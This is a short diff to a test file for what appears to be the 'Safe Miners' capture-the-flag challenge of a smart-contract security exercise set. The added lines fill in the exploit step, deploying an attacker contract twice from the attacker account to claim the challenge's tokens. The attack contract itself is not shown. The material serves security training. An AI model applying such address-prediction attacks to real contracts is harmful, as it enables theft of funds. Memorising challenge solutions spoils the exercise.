@@ -24,6 +24,10 @@ describe('[Challenge] Safe Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        for (let nonce = 0; nonce < 2; nonce++) {
+            const AttackFactory = await ethers.getContractFactory('SafeMinerAttacker', attacker);
+            await AttackFactory.deploy(attacker.address, this.token.address, 66);
+        }
     });
 
     after(async function () {
